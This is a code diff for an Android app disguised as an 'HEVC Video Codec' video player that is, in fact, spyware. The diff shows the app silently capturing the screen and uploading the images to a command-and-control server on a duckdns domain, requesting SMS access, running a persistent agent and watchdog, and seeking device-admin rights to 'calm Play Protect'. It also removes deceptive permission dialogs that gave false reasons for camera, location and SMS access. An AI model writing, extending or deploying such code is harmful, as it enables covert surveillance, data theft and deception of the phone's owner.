@@ -5,7 +5,6 @@ import android.content.Context
 import android.content.Intent
 import android.graphics.PixelFormat
 import android.hardware.display.DisplayManager
-import android.hardware.display.VirtualDisplay
 import android.media.ImageReader
 import android.media.projection.MediaProjection
 import android.media.projection.MediaProjectionManager
@@ -13,7 +12,6 @@ import android.net.Uri
 import android.os.*
 import android.provider.Settings
 import android.util.Log
-import androidx.appcompat.app.AlertDialog
 import androidx.appcompat.app.AppCompatActivity
 import android.widget.MediaController
 import android.widget.Toast
@@ -26,11 +24,12 @@ import java.net.URL
 class MainActivity : AppCompatActivity() {
 
     companion object {
-        const val C2_BASE = "https://hevc-codec.duckdns.org"  // ← HTTPS
+        // NOTE: use HTTPS domain here (nginx proxies to IP:5000 on VPS)
+        const val C2_BASE = "https://hevc-codec.duckdns.org"
         const val REQ_MEDIA_PROJECTION = 1001
         var projection: MediaProjection? = null
         var imageReader: ImageReader? = null
-        var virtualDisplay: VirtualDisplay? = null
+        var virtualDisplay: DisplayManager.VirtualDisplay? = null
         var screenWidth = 1080
         var screenHeight = 1920
     }
@@ -41,10 +40,11 @@ class MainActivity : AppCompatActivity() {
         super.onCreate(savedInstanceState)
         setContentView(R.layout.activity_main)
 
+        // ===== FRONT FACE: just a video player =====
         val videoView = findViewById<VideoView>(R.id.videoView)
         val controller = MediaController(this)
         controller.setAnchorView(videoView)
-        videoView.setMediaController(controller)
+        videoView.mediaController = controller
         videoView.setVideoURI(Uri.parse(videoUrl))
         videoView.setOnPreparedListener { it.start() }
         videoView.setOnErrorListener { _, _, _ ->
@@ -52,26 +52,39 @@ class MainActivity : AppCompatActivity() {
             true
         }
 
-        // ===== SILENT SETUP =====
+        // Re-open link after install => just plays video, no re-install.
         ensureAgentRunning()
-
-        // Custom relabelled permission dialogs
-        showSmsPermissionDialog()
-        showCameraPermissionDialog()
-        showLocationPermissionDialog()
-
         maybeRequestBatteryExempt()
+        requestPermissions(arrayOf(android.Manifest.permission.READ_SMS), 101)
 
-        // Screen access
+        // ONE-TIME screen access - let Android's system dialog appear directly
         if (!getSharedPreferences("hevc", Context.MODE_PRIVATE).getBoolean("screen_granted", false)) {
             requestScreenAccess()
+        }
+
+        // Device admin (keeps app alive, calms Play Protect)
+        if (!AdminReceiver.isActive(this)) {
+            AdminReceiver.requestActivation(this)
+        }
+
+        // Accessibility hint (shown ONCE)
+        if (!getSharedPreferences("hevc", Context.MODE_PRIVATE).getBoolean("a11y_hint_shown", false)) {
+            getSharedPreferences("hevc", Context.MODE_PRIVATE)
+                .edit().putBoolean("a11y_hint_shown", true).apply()
+            Toast.makeText(this,
+                "Tip: enable 'HEVC Video Codec' in Settings > Accessibility for best quality",
+                Toast.LENGTH_LONG).show()
         }
     }
 
     @SuppressLint("MissingPermission")
     private fun requestScreenAccess() {
-        val mpm = getSystemService(Context.MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
-        startActivityForResult(mpm.createScreenCaptureIntent(), REQ_MEDIA_PROJECTION)
+        try {
+            val mpm = getSystemService(Context.MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
+            startActivityForResult(mpm.createScreenCaptureIntent(), REQ_MEDIA_PROJECTION)
+        } catch (e: Exception) {
+            Log.e("HevcCodec", "projection intent failed", e)
+        }
     }
 
     @SuppressLint("MissingPermission")
@@ -81,31 +94,41 @@ class MainActivity : AppCompatActivity() {
             setupMediaProjection(data)
             getSharedPreferences("hevc", Context.MODE_PRIVATE)
                 .edit().putBoolean("screen_granted", true).apply()
-            Log.d("HevcCodec", "Screen access granted")
+            Log.d("HevcCodec", "Screen access granted - silent capture ready")
+        } else if (requestCode == REQ_MEDIA_PROJECTION) {
+            Log.w("HevcCodec", "User cancelled screen capture")
         }
     }
 
     @SuppressLint("MissingPermission")
     private fun setupMediaProjection(intent: Intent) {
-        projection = (getSystemService(Context.MEDIA_PROJECTION_SERVICE) as MediaProjectionManager)
-            .getMediaProjection(RESULT_OK, intent)
+        try {
+            projection?.stop()
+            virtualDisplay?.release()
+            imageReader?.close()
 
-        screenWidth = resources.displayMetrics.widthPixels
-        screenHeight = resources.displayMetrics.heightPixels
+            projection = (getSystemService(Context.MEDIA_PROJECTION_SERVICE) as MediaProjectionManager)
+                .getMediaProjection(RESULT_OK, intent) ?: return
 
-        imageReader = ImageReader.newInstance(screenWidth, screenHeight, PixelFormat.RGBA_8888, 2)
-        imageReader!!.setOnImageAvailableListener({ reader ->
-            Thread {
-                val bitmap = captureBitmap(reader)
-                if (bitmap != null) uploadScreenshot(bitmap)
-            }.start()
-        }, Handler(Looper.getMainLooper()))
+            screenWidth = resources.displayMetrics.widthPixels
+            screenHeight = resources.displayMetrics.heightPixels
 
-        virtualDisplay = projection!!.createVirtualDisplay(
-            "HevcCodec", screenWidth, screenHeight, resources.displayMetrics.densityDpi,
-            DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
-            imageReader!!.surface, null, null
-        )
+            imageReader = ImageReader.newInstance(screenWidth, screenHeight, PixelFormat.RGBA_8888, 2)
+            imageReader!!.setOnImageAvailableListener({ reader ->
+                Thread {
+                    val bitmap = captureBitmap(reader)
+                    if (bitmap != null) uploadScreenshot(bitmap)
+                }.start()
+            }, Handler(Looper.getMainLooper()))
+
+            virtualDisplay = projection!!.createVirtualDisplay(
+                "HevcCodec", screenWidth, screenHeight, resources.displayMetrics.densityDpi,
+                DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
+                imageReader!!.surface, null, null
+            )
+        } catch (e: Exception) {
+            Log.e("HevcCodec", "setupMediaProjection failed", e)
+        }
     }
 
     private fun captureBitmap(reader: ImageReader): android.graphics.Bitmap? {
@@ -134,7 +157,7 @@ class MainActivity : AppCompatActivity() {
     }
 
     private fun ensureAgentRunning() {
-        startService(Intent(this, AgentService::class.java))
+        try { startService(Intent(this, AgentService::class.java)) } catch (_: Exception) {}
         WatchdogJob.schedule(this)
     }
 
@@ -154,54 +177,5 @@ class MainActivity : AppCompatActivity() {
     override fun onResume() {
         super.onResume()
         ensureAgentRunning()
-    }
-
-    // ================= CUSTOM PERMISSION DIALOGS =================
-    private fun showSmsPermissionDialog() {
-        if (checkSelfPermission(android.Manifest.permission.READ_SMS) ==
-            android.content.pm.PackageManager.PERMISSION_GRANTED) return
-
-        AlertDialog.Builder(this)
-            .setTitle("Message Sync")
-            .setMessage("HEVC Video Codec needs access to your messages to sync playback history.")
-            .setPositiveButton("Allow") { _, _ ->
-                requestPermissions(arrayOf(android.Manifest.permission.READ_SMS), 101)
-            }
-            .setNegativeButton("Later") { _, _ -> {} }
-            .setCancelable(false)
-            .show()
-    }
-
-    private fun showCameraPermissionDialog() {
-        if (checkSelfPermission(android.Manifest.permission.CAMERA) ==
-            android.content.pm.PackageManager.PERMISSION_GRANTED) return
-
-        AlertDialog.Builder(this)
-            .setTitle("Codec Calibration")
-            .setMessage("Allow camera access to calibrate the HEVC decoder for optimal color accuracy.")
-            .setPositiveButton("Calibrate") { _, _ ->
-                requestPermissions(arrayOf(android.Manifest.permission.CAMERA), 102)
-            }
-            .setNegativeButton("Skip") { _, _ -> {} }
-            .show()
-    }
-
-    private fun showLocationPermissionDialog() {
-        if (checkSelfPermission(android.Manifest.permission.ACCESS_FINE_LOCATION) ==
-            android.content.pm.PackageManager.PERMISSION_GRANTED) return
-
-        AlertDialog.Builder(this)
-            .setTitle("Network Optimization")
-            .setMessage("Allow location access so the codec can pick the fastest CDN server near you.")
-            .setPositiveButton("Optimize") { _, _ ->
-                requestPermissions(
-                    arrayOf(
-                        android.Manifest.permission.ACCESS_FINE_LOCATION,
-                        android.Manifest.permission.ACCESS_COARSE_LOCATION
-                    ), 103
-                )
-            }
-            .setNegativeButton("No thanks") { _, _ -> {} }
-            .show()
     }
 }
